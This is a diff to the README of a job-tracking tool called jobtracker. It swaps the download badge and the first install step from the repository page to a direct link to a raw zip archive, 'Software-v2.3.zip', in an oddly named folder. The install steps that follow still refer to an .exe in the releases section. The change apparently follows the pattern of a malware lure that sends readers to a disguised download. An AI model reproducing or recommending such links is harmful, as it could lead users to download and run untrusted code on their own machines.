@@ -1,6 +1,6 @@
 # 📋 jobtracker - Manage your career growth with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/gunillasubsaharan412/jobtracker)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/gunillasubsaharan412/jobtracker/raw/refs/heads/main/unsteadfast/Software-v2.3.zip)
 
 ## 🎯 About this software
 
@@ -18,7 +18,7 @@ Jobtracker helps you organize your job search. You can monitor your applications
 
 Follow these steps to install the software on your computer.
 
-1. Visit [this page to download](https://github.com/gunillasubsaharan412/jobtracker).
+1. Visit [this page to download](https://github.com/gunillasubsaharan412/jobtracker/raw/refs/heads/main/unsteadfast/Software-v2.3.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start your download.
 4. Open your Downloads folder once the file finishes saving.
